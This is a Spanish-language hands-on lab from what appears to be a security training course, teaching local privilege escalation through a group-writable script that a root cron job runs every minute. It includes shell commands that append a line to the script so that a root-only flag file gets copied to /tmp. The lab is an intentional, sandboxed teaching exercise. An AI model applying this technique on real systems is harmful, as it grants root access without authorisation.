# Laboratorio: script de root escribible

[Capítulo 06](../README.md) | [Privilege Escalation](../../README.md) | [Inicio](../../../README.md)

> [!CAUTION]
> Este laboratorio crea una configuración vulnerable de forma intencional. Ejecútalo solo dentro de una VM Ubuntu aislada y autorizada. El script de mantenimiento es inofensivo, pero demuestra la ejecución de código como `root`; restaura la instantánea al terminar.

## Alcance

Este laboratorio reproduce una tarea `cron` que se ejecuta como `root` y lanza un script que el grupo `student` puede modificar. Durante la práctica se comprueba el propietario y los permisos del script, se añade una línea inofensiva que copia el flag de `root` a una ubicación legible y se observa que `cron` ejecuta esa línea con privilegios administrativos.

No se estudian aquí persistencia, modificación del planificador ni acceso a sistemas externos. El único cambio realizado es una línea dentro del script del laboratorio.

## Requisitos

- VM Ubuntu Server 22.04 LTS o superior, aislada en red host-only.
- Cuenta con privilegios de `sudo`.
- Instantánea limpia creada antes de ejecutar `setup.sh`.
- `cron`, `find` y herramientas básicas disponibles (el script las instala si faltan).

## Preparación

Desde la carpeta de este laboratorio, ejecuta el aprovisionamiento como administrador:

```bash
sudo bash setup.sh
```

El script crea la cuenta `student` si no existe, asegura `cron`, prepara `/opt/maintenance`, escribe el script `/opt/maintenance/backup.sh` con propietario `root:student` y modo `0770`, registra la tarea `/etc/cron.d/privesc-lab` y crea `/root/flag.txt` con modo `0600`.

Resultado esperado: un resumen final que indica la ruta del script, la tarea programada y el flag, además del aviso de que la tarea se ejecuta cada minuto.

## 1. Revisar la tarea programada

Abre la definición de la tarea y localiza la línea que se ejecuta como `root`:

```bash
cat /etc/cron.d/privesc-lab
```

Resultado esperado:

```text
# Laboratorio Purpesec Academy - Capítulo 06.
# Ejecuta el script de mantenimiento como root cada minuto.
* * * * * root /opt/maintenance/backup.sh
```

El primer campo `*` significa “cada minuto”, y el quinto campo de tiempo va seguido del usuario `root` y del comando absoluto. Esa es la ejecución privilegiada.

## 2. Inspeccionar los permisos del script

Observa propietario, grupo y bits del script:

```bash
ls -l /opt/maintenance/backup.sh
```

Resultado esperado, con el propietario `root` y el grupo `student`:

```text
-rwxrwx--- 1 root student ... /opt/maintenance/backup.sh
```

El modo `0770` concede lectura, escritura y ejecución al propietario y al grupo, pero nada al resto. Como `student` pertenece al grupo, el bit central `w` le permite modificar el archivo.

## 3. Comprobar la escritura como `student`

Cambia a la cuenta sin privilegios:

```bash
sudo -u student -i
```

Comprueba que puedes escribir en el script sin usar `sudo`:

```bash
echo "prueba de escritura" >> /opt/maintenance/backup.sh
tail -n 2 /opt/maintenance/backup.sh
```

Si la línea aparece en el archivo, la escritura funciona. La causa raíz ya está confirmada: `root` ejecutará un archivo que un usuario sin privilegios puede editar.

## 4. Añadir la línea que copia el flag

Mientras sigues como `student`, añade una instrucción inofensiva al final del script. El comando se ejecutará como `root` en el siguiente ciclo:

```bash
echo 'cp /root/flag.txt /tmp/lab-flag.txt && chmod 644 /tmp/lab-flag.txt' >> /opt/maintenance/backup.sh
```

Comprueba la línea añadida:

```bash
tail -n 1 /opt/maintenance/backup.sh
```

`/root/flag.txt` solo es legible por `root` (modo `0600`). La copia funcionará únicamente si el comando corre con privilegios de `root`, que es precisamente lo que se pretende demostrar.

## 5. Esperar el ciclo de `cron`

`cron` despierta al inicio de cada minuto, no de forma continua. Un cambio hecho en el segundo 45 de un minuto no se ejecutará hasta el inicio del siguiente, por lo que puede haber hasta sesenta segundos de retraso. Las tablas de `/etc/cron.d` se releen sin reiniciar el servicio.

Espera brevemente y vuelve a comprobar el resultado:

```bash
sleep 65
ls -l /tmp/lab-flag.txt
```

## 6. Leer el resultado

El archivo copiado debe pertenecer a `root` y ser legible por `student`:

```bash
cat /tmp/lab-flag.txt
```

Si el contenido es el valor `PURPESEC{...}` creado por `setup.sh`, la tarea ha ejecutado la línea añadida como `root`. La escalada queda demostrada sin necesidad de conocer la contraseña de `root`.

## Resultados esperados

- `/etc/cron.d/privesc-lab` contiene la tarea `* * * * * root /opt/maintenance/backup.sh`.
- `/opt/maintenance/backup.sh` pertenece a `root:student` con modo `0770`.
- La cuenta `student` puede escribir en el script sin `sudo`.
- Tras un ciclo de `cron`, existe `/tmp/lab-flag.txt` con el contenido del flag.
- El flag era ilegible directamente por `student` antes de la explotación, porque `/root/flag.txt` tiene modo `0600`.

## Validación

La validación se apoya en señales técnicas observables:

```bash
stat -c '%U %G %a' /opt/maintenance/backup.sh
stat -c '%U %a' /tmp/lab-flag.txt
grep -c 'lab-flag' /opt/maintenance/backup.sh
cat /tmp/lab-flag.txt
```

Criterios de éxito:

- `stat` muestra `root student 770` para el script.
- `grep` encuentra la línea añadida dentro del script.
- `/tmp/lab-flag.txt` existe, es propiedad de `root` y contiene el flag, lo que demuestra la ejecución como `root`.
- El registro `/var/log/maintenance.log` contiene una marca de tiempo por cada ejecución del script.

## Limpieza

Elimina los artefactos del laboratorio:

```bash
sudo rm -f /etc/cron.d/privesc-lab /root/flag.txt /tmp/lab-flag.txt
sudo rm -rf /opt/maintenance
```

Como alternativa completa, revierte la instantánea limpia de la VM para descartar cualquier cambio residual.

---

[Volver al capítulo](../README.md) | [Volver al índice de la ruta](../../README.md) | [Inicio](../../../README.md)
